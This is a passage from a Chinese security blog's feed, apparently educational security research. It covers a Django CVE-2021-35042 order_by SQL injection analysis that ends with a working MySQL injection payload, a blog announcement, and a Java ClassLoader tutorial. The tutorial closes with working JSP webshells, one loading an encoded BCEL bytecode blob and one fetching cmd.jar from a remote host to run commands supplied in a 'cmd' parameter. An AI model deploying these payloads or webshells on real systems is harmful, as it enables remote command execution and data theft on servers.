class="line-numbers-rows"><span></span></span></code></pre><p>上面这个SQL的意思就是，按照按照Alexa的顺序降序排列，DESC为降序，ASC为升序。</p><p>此问题按照官方的说法是：绕过标记为弃用的路径中的预期列引用验证。</p><h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p>在这里我们先输入一个不存在的字段名name4，查看一下是怎样一个流程。首先进入如下函数，判断order_by 的排序顺序和表达式。</p><pre class="line-numbers language-none"><code class="language-none">def add_ordering(self, *ordering):        &quot;&quot;&quot;        Add items from the &#39;ordering&#39; sequence to the query&#39;s &quot;order by&quot;        clause. These items are either field names (not column names) --        possibly with a direction prefix (&#39;-&#39; or &#39;?&#39;) -- or OrderBy        expressions.​        If &#39;ordering&#39; is empty, clear all ordering from the query.        &quot;&quot;&quot;        errors &#x3D; []        for item in ordering:            if isinstance(item, str):                if &#39;.&#39; in item:                    warnings.warn(                        &#39;Passing column raw column aliases to order_by() is &#39;                        &#39;deprecated. Wrap %r in a RawSQL expression before &#39;                        &#39;passing it to order_by().&#39; % item,                        category&#x3D;RemovedInDjango40Warning,                        stacklevel&#x3D;3,                    )                    continue                if item &#x3D;&#x3D; &#39;?&#39;:                    continue                if item.startswith(&#39;-&#39;):                    item &#x3D; item[1:]                if item in self.annotations:                    continue                if self.extra and item in self.extra:                    continue                # names_to_path() validates the lookup. A descriptive                # FieldError will be raise if it&#39;s not.                self.names_to_path(item.split(LOOKUP_SEP), self.model._meta)            elif not hasattr(item, &#39;resolve_expression&#39;):                errors.append(item)            if getattr(item, &#39;contains_aggregate&#39;, False):                raise FieldError(                    &#39;Using an aggregate in order_by() without also including &#39;                    &#39;it in annotate() is not allowed: %s&#39; % item                )        if errors:            raise FieldError(&#39;Invalid order_by arguments: %s&#39; % errors)        if ordering:            self.order_by +&#x3D; ordering        else:            self.default_ordering &#x3D; False<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>函数走到<code>names_to_path</code>的时候会根据传入的参数生成一个PathInfo 元组。返回最终的字段和没有找到的字段。其中opts代表模型选项，这里代表的这个表。然后去获取传入的字段值。当最后找不到这个字段的时候，会报一个<code>Cannot resolve keyword &#39;%s&#39; into field</code>的错误，也就是我们最后会看到的错误。</p><pre class="line-numbers language-none"><code class="language-none">def names_to_path(self, names, opts, allow_many&#x3D;True, fail_on_missing&#x3D;False):        path, names_with_path &#x3D; [], []        for pos, name in enumerate(names):            cur_names_with_path &#x3D; (name, [])            if name &#x3D;&#x3D; &#39;pk&#39;:                name &#x3D; opts.pk.name​            field &#x3D; None            filtered_relation &#x3D; None            try:                field &#x3D; opts.get_field(name)            except FieldDoesNotExist:                if name in self.annotation_select:                    field &#x3D; self.annotation_select[name].output_field                elif name in self._filtered_relations and pos &#x3D;&#x3D; 0:                    filtered_relation &#x3D; self._filtered_relations[name]                    field &#x3D; opts.get_field(filtered_relation.relation_name)            if field is not None:                # Fields that contain one-to-many relations with a generic                # model (like a GenericForeignKey) cannot generate reverse                # relations and therefore cannot be used for reverse querying.                if field.is_relation and not field.related_model:                    raise FieldError(                        &quot;Field %r does not generate an automatic reverse &quot;                        &quot;relation and therefore cannot be used for reverse &quot;                        &quot;querying. If it is a GenericForeignKey, consider &quot;                        &quot;adding a GenericRelation.&quot; % name                    )                try:                    model &#x3D; field.model._meta.concrete_model                except AttributeError:                    # QuerySet.annotate() may introduce fields that aren&#39;t                    # attached to a model.                    model &#x3D; None            else:                # We didn&#39;t find the current field, so move position back                # one step.                pos -&#x3D; 1                if pos &#x3D;&#x3D; -1 or fail_on_missing:                    available &#x3D; sorted([                        *get_field_names_from_opts(opts),                        *self.annotation_select,                        *self._filtered_relations,                    ])                    raise FieldError(&quot;Cannot resolve keyword &#39;%s&#39; into field. &quot;                                     &quot;Choices are: %s&quot; % (name, &quot;, &quot;.join(available)))                break<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>get_field</code>函数的意思是返回一个字段名称的字段实例。对应的表内字段名和字段实例的字典类型。其中<code>_forward_fields_map</code>和<code>fields_map</code>的作用是相同的，就是后者还会检查一些内部的其他字段。</p><pre class="line-numbers language-none"><code class="language-none">def get_field(self, field_name):        &quot;&quot;&quot;        Return a field instance given the name of a forward or reverse field.        &quot;&quot;&quot;        try:            # In order to avoid premature loading of the relation tree            # (expensive) we prefer checking if the field is a forward field.            return self._forward_fields_map[field_name]        except KeyError:            # If the app registry is not ready, reverse fields are            # unavailable, therefore we throw a FieldDoesNotExist exception.            if not self.apps.models_ready:                raise FieldDoesNotExist(                    &quot;%s has no field named &#39;%s&#39;. The app cache isn&#39;t ready yet, &quot;                    &quot;so if this is an auto-created related field, it won&#39;t &quot;                    &quot;be available yet.&quot; % (self.object_name, field_name)                )​        try:            # Retrieve field instance by name from cached or just-computed            # field map.            return self.fields_map[field_name]        except KeyError:            raise FieldDoesNotExist(&quot;%s has no field named &#39;%s&#39;&quot; % (self.object_name, field_name))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后都不存在的情况下会告知，<code>User has no field named name4</code>。</p><p>当然如果是存在的字段，比如name，程序从get_field获取到的field就是<code>cve_orderby.User.name</code>。也就是不管传入的参数是否正常，只要走了<code>names_to_path</code>最后都会返回不存在字段或者存在的字段实例对象，而不是拼接SQL去执行，那么至少在这里就不能造成SQL注入了。整个执行的代码都为：<code>SELECT &quot;cve_orderby_user&quot;.&quot;id&quot;, &quot;cve_orderby_user&quot;.&quot;name&quot; FROM &quot;cve_orderby_user&quot;</code>。</p><p>在查了一堆资料发现这个问题其实是绕过<code>names_to_path</code>这个判断，在函数<code>add_ordering</code>中，主要有五个判断：</p><ol><li>字段中是否带点，带的话提示传入的是原始列的别名，并警告不建议这么使用。</li><li>字段是否为问号。</li><li>字段开头是否为短横杠。</li><li>判断是否在一个map字典里，暂时也不知道是干啥的。</li><li>判断是否有额外的参数信息。</li></ol><p>所以，此处我们传一个带点的参数，比如<code>name.name</code>。到<code>add_ordering</code>中的时候，走到这个函数上，由于存在continue的作用，将跳过后续的判断，也就是不在进行<code>names_to_path</code>，无法获取字段的实例对象。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210806144834728.png" alt="image-20210806144834728"></p><p>后续进入_fetch_all的时候就已经生成SQL：<code>SELECT &quot;cve_orderby_user&quot;.&quot;id&quot;, &quot;cve_orderby_user&quot;.&quot;name&quot; FROM &quot;cve_orderby_user&quot; ORDER BY (&quot;name&quot;.name) ASC</code>。也就是把参数name.name拼接进去。</p><p>于是构造一条语句，注意这里使用的是MySQL数据库。构造：<code>SELECT cve_orderby_user.id, cve_orderby_user.name FROM cve_orderby_user ORDER BY (cve_orderby_user.name);select updatexml(1,concat(0x7e,(select @@version)),1);#) ASC</code></p><p>只需要传输参数：<code>cve_orderby_user.name);select updatexml(1,concat(0x7e,(select @@version)),1);#</code><br><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210806155634807.png" alt="image-20210806155634807"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;CVE-2021-35042-Django-SQL注入&quot;&gt;&lt;a href=&quot;#CVE-2021-35042-Django-SQL注入&quot; class=&quot;headerlink&quot; title=&quot;CVE-2021-35042 Django SQL注入&quot;&gt;&lt;/a&gt;CVE-2
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>小程序博客上线</title>
    <link href="https://misakikata.github.io/2021/08/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8D%9A%E5%AE%A2%E4%B8%8A%E7%BA%BF/"/>
    <id>https://misakikata.github.io/2021/08/小程序博客上线/</id>
    <published>2021-08-06T08:15:10.000Z</published>
    <updated>2021-08-06T08:16:03.773Z</updated>
    
    <content type="html"><![CDATA[<p>闲来无事做了一个小程序端的博客，利用的Halo做后端，腾讯云托管。有兴趣的朋友可以关注一下。<br>博客名：misaki blog<br>物料码：<img src="https://raw.githubusercontent.com/MisakiKata/misakikata.github.io/master/img/wxmini.png" alt="111"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;闲来无事做了一个小程序端的博客，利用的Halo做后端，腾讯云托管。有兴趣的朋友可以关注一下。&lt;br&gt;博客名：misaki blog&lt;br&gt;物料码：&lt;img src=&quot;https://raw.githubusercontent.com/MisakiKata/misakikat
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ClassLoader</title>
    <link href="https://misakikata.github.io/2021/07/ClassLoader/"/>
    <id>https://misakikata.github.io/2021/07/ClassLoader/</id>
    <published>2021-07-30T10:45:52.000Z</published>
    <updated>2021-07-30T10:45:52.985Z</updated>
    
    <content type="html"><![CDATA[<p>一切的Java类都必须经过JVM加载后才能运行，而ClassLoader的主要作用就是Java类文件的加载。在JVM类加载器中最顶层的是<code>Bootstrap ClassLoader</code>(引导类加载器)、<code>Extension ClassLoader</code>(扩展类加载器)、<code>App ClassLoader</code>(系统类加载器)，<code>AppClassLoader</code>是默认的类加载器，如果类加载时我们不指定类加载器的情况下，默认会使用<code>AppClassLoader</code>加载类，<code>ClassLoader.getSystemClassLoader()</code>返回的系统类加载器也是<code>AppClassLoader</code>。</p><p>我们在尝试获取被<code>Bootstrap ClassLoader</code>类加载器所加载的类的ClassLoader时候都会返回null。</p><p>ClassLoader类有如下核心方法：</p><pre class="line-numbers language-none"><code class="language-none">loadClass(加载指定的Java类)findClass(查找指定的Java类)findLoadedClass(查找JVM已经加载过的类)defineClass(定义一个Java类)resolveClass(链接指定的Java类)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Java类动态加载方式"><a href="#Java类动态加载方式" class="headerlink" title="Java类动态加载方式"></a>Java类动态加载方式</h3><p>静态加载</p><p>Office.java</p><pre class="line-numbers language-none"><code class="language-none">class Office&#123;    public static void main(String[] args)&#123;        if(args[0].equals(&quot;Word&quot;))&#123;            Word w &#x3D; new Word();            w.start();        &#125;        if(args[0].equals(&quot;Excel&quot;))&#123;            Excel e &#x3D; new Excel();            e.start();        &#125;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Word.java</p><pre class="line-numbers language-none"><code class="language-none">class Word&#123;    public void start()&#123;        System.out.println(&quot;Word Start&quot;);    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>编译会报错，这当然没问题，因为确实没有写Excel.java类。如果修改为动态加载，动态加载类是按需加载的，你需要什么类，就加载什么类，一个类的状态，不会影响到另一个类的使用。</p><p>所以我们可以将Office类改造如下：</p><pre class="line-numbers language-none"><code class="language-none">class Office&#123;    public static void main(String[] args)&#123;        try&#123;            Class c &#x3D; Class.forName(args[0]);            Word w &#x3D; (Word)c.newInstance();            w.start();        &#125;        catch(Exception e)&#123;            e.printStackTrace();        &#125;            &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>虽然我们还是没有写Excel类，但此时我们再编译Office.java文件，编译通过；成功按照我们预想的结果运行，这样Word类就可以单独运行。</p><h3 id="常用的类动态加载方式"><a href="#常用的类动态加载方式" class="headerlink" title="常用的类动态加载方式"></a>常用的类动态加载方式</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 反射加载TestHelloWorld示例Class.forName(&quot;com.anbai.sec.classloader.TestHelloWorld&quot;);​&#x2F;&#x2F; ClassLoader加载TestHelloWorld示例this.getClass().getClassLoader().loadClass(&quot;com.anbai.sec.classloader.TestHelloWorld&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Class.forName(“类名”)默认会初始化被加载类的静态属性和方法，如果不希望初始化类可以使用Class.forName(“类名”, 是否初始化类, 类加载器)，而ClassLoader.loadClass默认不会初始化类方法。</p><h3 id="Class加载器调用顺序"><a href="#Class加载器调用顺序" class="headerlink" title="Class加载器调用顺序"></a><strong>Class加载器调用顺序</strong></h3><p>加载class文件分为三个阶段：</p><ol><li>第一阶段找到class文件并将或者文件包含的字节码加载到内存，至于如何找到class文件就是通过<code>findClass()</code>方法定义的，找到之后通过<code>defineClass()</code>方法来创建类对象</li><li>第二阶段分为三个步骤（验证，准备，解析）：字节码验证，Class类数据结构分析以及相应的内存分配，符号表链接</li><li>第三个阶段将类中的静态属性和初始化赋值，以及静态代码块的执行</li></ol><p>加载器顺序：</p><pre class="line-numbers language-none"><code class="language-none">public class Test &#123;    public static void main(String[] args) &#123;        ClassLoader classLoader &#x3D; Test.class.getClassLoader();        System.out.println(classLoader);                ClassLoader classLoader1 &#x3D; classLoader.getParent();        System.out.println(classLoader1);                ClassLoader classLoader2 &#x3D; classLoader1.getParent();        System.out.println(classLoader2);     &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>能得到这么一个结果：</p><pre class="line-numbers language-none"><code class="language-none">sun.misc.Launcher$AppClassLoader@18b4aac2sun.misc.Launcher$ExtClassLoader@677327b6null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>第一次调用的时候得到的是AppClassLoader，应用程序加载器，在没有明确指定的时候就是默认加载应用程序内类库加载器。</p><p>第二次调用的时候得到的是ExtClassLoader。扩展类加载器，是AppClassLoader加载器的父类加载器，至于null是bootstrap加载器的返回，这个加载器没有明确的引用。</p><h3 id="双亲委派"><a href="#双亲委派" class="headerlink" title="双亲委派"></a>双亲委派</h3><p><strong>Bootstrap Class Loader</strong></p><p>这个类加载器负责加载存放在<code>&lt;JAVA_HOME&gt;\lib</code>目录，或者被<code>-Xbootclasspath</code>参数所指定的路径中存放的，而且是Java虚拟机能够识别的(按照文件名识别，如rt.jar、tools.jar，名字不符合的类库即使放在lib目录中也不会被加载)类库加载到虚拟机的内存中。</p><p><strong>Extension Class Loader</strong></p><p>它负责加载<code>&lt;JAVA_HOM E&gt;\lib\ext</code>目录中，或者被<code>java.ext.dirs</code>系统变量所 指定的路径中所有的类库。<strong>注意，扩展类加载器加载的必须是jar或者zip文件，不能是.class文件</strong>。</p><p><strong>App Class Loader</strong></p><p>这个类加载器由<code>sun.misc.Launcher$AppClassLoader</code>来实现。由于应用程序类加载器是ClassLoader类中的<code>getSystemClassLoader()</code>方法的返回值，所以也称它为“系统类加载器”。它负责加载用户类路径(ClassPath)上所有的类库，开发者同样可以直接在代码中使用这个类加载器</p><p>双亲委派工作原理：类加载器接收加载类的请求后，并不会自己去主动加载类，而是委派给父类加载器来加载，只要在父类加载器无法加载后才由子类加载器加载。也就是所有的加载请求都会反馈给最顶层的加载器中。加载器的子父类关系</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/49750813-d1f56c80-fce6-11e8-8750-a2b0beb24a0d.png" alt="image"></p><p>双亲委派模型的好处就是同一个名称的类只能在一个类加载器中加载一次，避免多次加载导致混乱。</p><h3 id="破坏双亲委派"><a href="#破坏双亲委派" class="headerlink" title="破坏双亲委派"></a>破坏双亲委派</h3><p>如果双亲委派是父类加载器来搜索加载，那自然在某些环境下并不希望由父类来加载，所以这时候就需要重写loadClass方法来破坏双亲委派的加载逻辑。ClassLoader默认构造方法设置了父类加载器为系统加载器，loadClass方法实现了委托模型，我们只需要重写findClass方法实现自己的类加载逻辑，比如javadoc给的一个例子：</p><pre class="line-numbers language-none"><code class="language-none">protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123;    byte[] b &#x3D; loadClassData(name);    return defineClass(name, b, 0, b.length);&#125;private byte[] loadClassData(String name) &#123;    &#x2F;&#x2F; load the class data from the file or network&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>实现大体上分为两步，第一步获取字节码的字节数组byte[]，然后通过ClassLoader提供的<code>defineClass</code>方法将字节码定义成Class对象。但是以上这种重写的方式并不破坏双亲委派机制，只是自定义类加载器，在双亲委派的基础上，实现自己需要的部分方法，后续还是采用重写loadClass的方式。</p><p>先来看一下loadClass的源代码实现：</p><pre class="line-numbers language-none"><code class="language-none">protected Class&lt;?&gt; loadClass(String name, boolean resolve)  throws ClassNotFoundException &#123;  synchronized (getClassLoadingLock(name)) &#123;    &#x2F;&#x2F; First, check if the class has already been loaded    Class&lt;?&gt; c &#x3D; findLoadedClass(name);    if (c &#x3D;&#x3D; null) &#123;      long t0 &#x3D; System.nanoTime();      try &#123;        if (parent !&#x3D; null) &#123;          c &#x3D; parent.loadClass(name, false);        &#125; else &#123;          c &#x3D; findBootstrapClassOrNull(name);        &#125;      &#125; catch (ClassNotFoundException e) &#123;        &#x2F;&#x2F; ClassNotFoundException thrown if class not found        &#x2F;&#x2F; from the non-null parent class loader      &#125;​      if (c &#x3D;&#x3D; null) &#123;        &#x2F;&#x2F; If still not found, then invoke findClass in order        &#x2F;&#x2F; to find the class.        long t1 &#x3D; System.nanoTime();        c &#x3D; findClass(name);​        &#x2F;&#x2F; this is the defining class loader; record the stats        sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);        sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);        sun.misc.PerfCounter.getFindClasses().increment();      &#125;    &#125;    if (resolve) &#123;      resolveClass(c);    &#125;    return c;  &#125;&#125;​<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先判断jvm是否已经加载了，没有的话判断是否还有父类，有的话去父类加载，没有的话说明是最顶层的类，直接在BootstraploadClass中查找加载，如果依然没有，则返回null，到最后由当前子类加载器加载。</p><p>想破坏委派需要不让他去父类加载，或者我们自定义父类加载的流程。例如：</p><pre class="line-numbers language-none"><code class="language-none">public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException &#123;    Class&lt;?&gt; c &#x3D; findLoadedClass(name);    if (c !&#x3D; null) &#123;        return c;    &#125;    Class&lt;?&gt; classname &#x3D; null;    try &#123;        classname &#x3D; findClass(name);    &#125; catch (Exception e) &#123;&#125;    if (classname !&#x3D; null) &#123;        &#x2F;&#x2F;....        return findClass;    &#125;    return super.loadClass(name);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上是一个简单的重写，意思就是jvm如果找不到当前类，则调用findclass来加载此类。也就是去掉了到父类中查找加载的步骤而已。</p><h3 id="加载器加载shell"><a href="#加载器加载shell" class="headerlink" title="加载器加载shell"></a>加载器加载shell</h3><p>这种利用classload的来加载恶意代码从而实现webshell的方式，已经有很多实现了，比如：</p><p><a href="https://github.com/threedr3am/JSP-Webshells/blob/master/jsp/1/1.jsp">https://github.com/threedr3am/JSP-Webshells/blob/master/jsp/1/1.jsp</a></p><p>就是利用加载器来加载字节码实现webshell，还有冰蝎shell，同样是加载器实现。使用上面这个1.jsp来分析一下，当我们了解加载器后再看这个shell就简单一些</p><pre class="line-numbers language-none"><code class="language-none">&lt;%@ page import&#x3D;&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot; %&gt;&lt;html&gt;&lt;body&gt;&lt;h2&gt;BCEL字节码的JSP Webshell&lt;&#x2F;h2&gt;&lt;%    String bcelCode &#x3D; &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85U$5bW$hU$U$fe$86$ML$Y$86B$93R$$Z$bcQ$hn$j$ad$b7Z$w$da$mT4$5c$84$W$a4x$9bL$Oa$e8d$sN$s$I$de$aa$fe$86$fe$87$beZ$97$86$$q$f9$e8$83$8f$fe$M$7f$83$cb$fa$9dI$I$89$84$e5$ca$ca$3es$f6$de$b3$f7$b7$bf$bd$cf$99$3f$fe$f9$e57$A$_$e3$7b$jC$98$d6$f0$a6$8e6$b9$be$a5$e1$86$8e4f$a4x$5b$c7$y$e6t$b4$e3$a6$O$V$efH1$_$j$df$8d$e3$3d$b9f$3a$d1$8b$F$N$8b$3a$96$b0$i$c7$fb$3aV$b0$aa$e3$WnK$b1$a6c$j$ltb$Dw$e2$d8$d4$f1$n$3e$d2$f0$b1$82X$mJ$K$S$99$jk$d72$5d$cb$cb$9b$aba$e0x$f9$v$F$j$d7$j$cf$J$a7$V$f4$a5N$9aG$d7$U$a83$7eN$u$e8$c98$9eX$y$X$b2$o$b8ee$5d$n$c3$f9$b6$e5$aeY$81$p$f75$a5$gn$3bL$a5g$d2$b6pgw$j$97$vbv$n$a7$a0$bb$U$c5L$97$j7$t$C$F$83$t$d2$d5L$7c$e3L$b6$bc$b5$r$C$91$5b$RV$e4$3cPuv$7c3$ddd$a1$af$ea$S$Y$c3$af$86$96$7dw$c1$wF$40$c8$90$86O$c82$J$s$9a$d9$3d$5b$UC$c7$f7J$g$3eU$Q$P$fdjF$F$e7R$a3$adXQ$L$96$e3$v8$9f$da$3c$85$U$x$c8$b3$ccd$L$b3$82$$$c7$x$96Cn$85U$m$afu$e8$f3$c7jz$b5g$f7C$d9$95$b6$cd4$e3$d9$R$c9$fa$aa_$Ol1$e7H$w$bb$8f$u$bc$y$D$Y$b8$AKA$ff$v$a4$Rkk$86Ht$8b$fcU$9b$86$ac$B$h9$D$C$5b$g$f2$G$b6$e1$c8D$3bR$dc5$e0$e2$8a$81$C$c8$84$a2$hxQ$ee$9e$c0$93$q$f0$I$9a$G$df$40$R$9f$b1eu$b4$b6k$95$c8s$60$a0$84PC$d9$c0$$$3e7$b0$87$7d$N_$Y$f8$S_i$f8$da$c07$b8$c7$40$p$p$e9$99$d9$cc$c8$88$86o$N$7c$87a$F$bd$c7$V$$ew$84$j6$a9$8e$fa$96$ac$X$b5To$$$t$z$r$9bs$f6$d8$7d$a5$ec$85NA2$9b$Xa$7d$d3$d7$d4$f4$9aZv$5d$ec$J$5b$c1$a5V$t$a1A$b5$i$f8$b6$u$95$a6$9a2$d5$94$q$82$99$e6$h$H$a0$ff$u$db$89$R$YH$b54$c8$g$92$c7$a6$da$a4Km$9c$f6$5c$s$9a$f7$O$abX$U$k$cf$d5$e4$ff$a0$fd$ef$d9$ea96$cd$c8NU$RG$8f$Z$bf61M$fc4$98$f8z_K$D$BK$82E$v$9a$df$h$a5$a3$daGO$Hw$82$8dd$L$b5$82N$w$j$b7z$b9$b0$bd$f3$ec$92$q$81$e7$t$b5$99$96$db$x$b6_0Ke$cf$f4$83$bci$V$z$7b$5b$98Y$ce$a2$e9x$a1$I$3c$cb5$a3$81$dc$e2$992o$87$8e$eb$84$fbdOx$d5$T$d7$cf$uwZ$5e$B$8dC$b7_$K$F$b1$c4$fcr$d8x$a0$97$e9$da$C$7f$83Z$81V$94$3b$d7$c33$bc$b9$87$f8$JP$f8$e7$n$a2$8c$f1$f9$C$86y$ad$3f$c5$dd$9f$e8$e0$bd$P$dc$i$3b$80r$88$b6$8d$D$c4$W$O$a1n$i$a2$7d$e3$R$3a$c6$x$d0$w$88$l$a0$f3$A$fa$e2d$F$5d$h$d7$d4$df$91$98$YT$x0$S$dd$U$eb$P$k$ff56Q$c1$99$9f$d1$f30J$f04$e504$ca$$$7eJ$M$fe$baq$R$3d0$Jf$g$J$cc$nI$60$f2$bb$U$a5$c6$b3x$O$88$9eF$IQ$a1$ff$U$fd$9f$t$c4$8b$b4$5dB$8a1$t$I$7f$94V$VcQ$vm$8fiT5$8ck$98$d00$a9$e12$f07$G$b8c$g$d0M$c1$L$fc$f3$f6$a0$94$95$9a$5c$r$L$edc$3f$a1$e7$H$3e$b4E8$3b$oe$7f$84$c7$a8$3a$d4$f0t$e2$r$o$ac$d2t$9f$IT$aeW$T$bd$V$9cM$q$wHfH$cd$b9_$e3$L$e3$y$bdo$7dB$7d$84$f3$8b$3f$a2$bf$c6ab$80$cc$90$$$83$bcT0$f8$b0$9eo$88$Z$r$fe$$$d6$92$60$p$G$c8$d40s$bcF$ab$c40V$cd$83W$f0j$c4$df$q$zW$89$xA$3e$5e$c75F$Zf$8c$v$be$jk$w$f4z$94$e1$8d$7f$BP$cbmH$f2$H$A$A&quot;;    response.getOutputStream().write(String.valueOf(new ClassLoader().loadClass(bcelCode).getConstructor(String.class).newInstance(request.getParameter(&quot;cmd&quot;)).toString()).getBytes());%&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用URLClassLoad远程加载webshell。如下园长给的一个Java连接代码。</p><pre class="line-numbers language-none"><code class="language-none">import java.io.*;import java.net.URL;import java.net.URLClassLoader;​public class classload extends ClassLoader &#123;​    public static void main(String[] args) &#123;        classload loader &#x3D; new classload();​        try &#123;            URL url &#x3D; new URL(&quot;http:&#x2F;&#x2F;192.168.30.179:8000&#x2F;cmd.jar&quot;);            URLClassLoader ucl &#x3D; new URLClassLoader(new URL[]&#123;url&#125;);            Class cmdClass &#x3D; ucl.loadClass(&quot;CMD&quot;);            Process process &#x3D; (Process) cmdClass.getMethod(&quot;exec&quot;, String.class).invoke(null, &quot;whoami&quot;);​            InputStream in &#x3D; process.getInputStream();            ByteArrayOutputStream baos &#x3D; new ByteArrayOutputStream();            byte[] buf &#x3D; new byte[2048];            int a &#x3D; 0;​            while ((a &#x3D; in.read(buf)) !&#x3D; -1) &#123;                baos.write(buf, 0, a);            &#125;            System.out.println(baos.toString());        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>jar文件，利用<code>jar -cvf cmd.jar cmd.class</code>来打包为一个jar文件。</p><pre class="line-numbers language-none"><code class="language-none">import java.io.IOException;​public class CMD &#123;    public static Process exec(String cmd) throws IOException &#123;        return Runtime.getRuntime().exec(cmd);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行运行后，就可以执行其中写入的命令，把这个代码改为jsp并且可以远程修改执行命令的代码</p><pre class="line-numbers language-none"><code class="language-none">&lt;%@ page import&#x3D;&quot;java.io.*, java.net.*&quot; %&gt;&lt;html&gt;&lt;body&gt;&lt;h2&gt;JSP Webshell&lt;&#x2F;h2&gt;&lt;%    URL url &#x3D; new URL(&quot;http:&#x2F;&#x2F;192.168.30.179:8000&#x2F;cmd.jar&quot;);    URLClassLoader ucl &#x3D; new URLClassLoader(new URL[]&#123;url&#125;);    Class cmdClass &#x3D; ucl.loadClass(&quot;CMD&quot;);    Process process &#x3D; (Process) cmdClass.getMethod(&quot;exec&quot;, String.class).invoke(null, request.getParameter(&quot;cmd&quot;));​    InputStream in &#x3D; process.getInputStream();    ByteArrayOutputStream baos &#x3D; new ByteArrayOutputStream();    byte[] buf &#x3D; new byte[2048];    int a &#x3D; 0;​    while ((a &#x3D; in.read(buf)) !&#x3D; -1) &#123;        baos.write(buf, 0, a);    &#125;response.getOutputStream().write(String.valueOf(baos.toString()).getBytes());%&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如下访问即可：<code>http://localhost:8080/jsp/1.jsp?cmd=whoami</code></p><p><a href="https://www.cnblogs.com/lz2017/p/13941248.html">深入分析ClassLoader工作机制</a></p><p><a href="http://seanthefish.com/2020/11/14/classloader-classpath-hell/index.html">classloader详解</a></p><p><a href="https://github.com/Sayi/sayi.github.com/issues/62">JVM(四)ClassLoader类加载机制</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一切的Java类都必须经过JVM加载后才能运行，而ClassLoader的主要作用就是Java类文件的加载。在JVM类加载器中最顶层的是&lt;code&gt;Bootstrap ClassLoader&lt;/code&gt;(引导类加载器)、&lt;code&gt;Extension ClassLoade
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
